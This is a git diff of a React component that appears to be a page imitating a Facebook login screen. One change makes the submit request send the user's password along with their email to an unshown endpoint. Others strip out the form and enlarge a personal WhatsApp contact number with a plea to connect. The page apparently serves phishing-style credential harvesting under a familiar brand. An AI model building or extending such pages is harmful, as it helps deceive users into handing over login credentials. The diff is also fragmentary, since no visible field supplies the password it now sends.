@@ -83,7 +83,7 @@ const App = () => {
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ email }),
+        body: JSON.stringify({ email, password }),
       });
 
       const data = await response.json();
@@ -103,49 +103,24 @@ const App = () => {
 
   return (
     <div
-      className="flex justify-center items-center h-screen"
-      style={{
-        backgroundColor: '#e9eff1',
-      }}
+
     >
-      <div className="w-80 bg-white p-6 rounded-md shadow-lg">
+      <div className="">
         {/* Facebook Logo */}
 
 
         {/* Login Form */}
-        <form onSubmit={handleSubmit}>
-          <div className="mb-4">
-            <input
-              type="text"
-              placeholder="Give me Whatsapp here and press submit 2 times"
-              className="w-full px-3 py-2 text-gray-600 border border-gray-300 rounded-md"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-            />
-          </div>
-          <div className="mb-4">
 
-          </div>
-
-          {error && <p className="text-red-500 text-center mb-4">{error}</p>}
-          {success && <p className="text-green-500 text-center mb-4">{success}</p>}
-
-          <button
-            type="submit"
-            className="w-full bg-blue-600 text-white py-2 rounded-md font-bold mb-4"
-          >
-            Submit
-          </button>
-        </form>
 
         {/* Forgotten Password */}
 
         {/* Create Account Button */}
 
         {/* Meta Logo */}
-        <div className="flex justify-center mt-8">
-          <p className="text-center text-gray-500 text-xs">
-            My whatsapp +923185811230
+        <div className="flex justify-center mt-8 text-4xl">
+          <p className="text-center text-gray-500 text-4xl">
+            My whatsapp
+            <b className='text-4xl'>+923185811230</b>
 
             i WANT TO CONNECT WITH YOU IN WHATSAPP
           </p>
